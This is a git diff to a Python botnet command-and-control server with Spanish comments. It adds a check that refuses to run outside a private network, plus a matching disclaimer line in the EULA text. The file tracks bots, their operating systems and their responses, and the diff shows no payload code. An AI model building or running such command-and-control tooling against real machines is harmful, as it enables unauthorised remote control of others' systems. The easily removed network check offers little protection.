@@ -2,6 +2,7 @@ import socket
 import threading
 import time
 import os
+import ipaddress
 
 HOST = "172.31.128.167" # IP del servidor
 PORT = 9999 # Puerto que escucha
@@ -10,7 +11,25 @@ bot_ids = {} # Diccinario con los IDS de los bots
 sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
 respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
 
-import os
+def es_red_privada(ip):
+    """Indica si una IP es de una red privada o no.
+
+    La función intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve
+    el resultado de llamar a su método is_private(). Si la IP no es válida,
+    devuelve False.
+
+    Parameters:
+    ip (str): La IP a verificar.
+
+    Returns:
+    bool: True si la IP es de una red privada, False si no lo es.
+    """
+
+    try:
+        return ipaddress.ip_address(ip).is_private
+    except ValueError:
+        return False
+
 
 def verificar_eula(tipo):
     """
@@ -43,6 +62,7 @@ def verificar_eula(tipo):
     print("El usuario debe cumplir con las leyes de su país.")
     print("No se permite el uso de este software en redes públicas.")
     print("El autor no se hace responsable del uso indebido.\n")
+    print("EL SOFTWARE NO FUNCIONARÁ FUERA DE UNA RED PRIVADA.\n")
     
     print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
     print("   - Usarlo con intenciones maliciosas.")
@@ -61,7 +81,6 @@ def verificar_eula(tipo):
     else:
         print("Debe aceptar la licencia para usar este software.")
         exit()
-
 
 def manejar_bot(conn, addr, bot_id):
     """
@@ -453,4 +472,7 @@ def cerrar_conexion_bots():
 
 if __name__ == "__main__":
     verificar_eula("servidor")
+    if not es_red_privada(HOST):
+        print("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
+        exit()
     servidor_CnC()
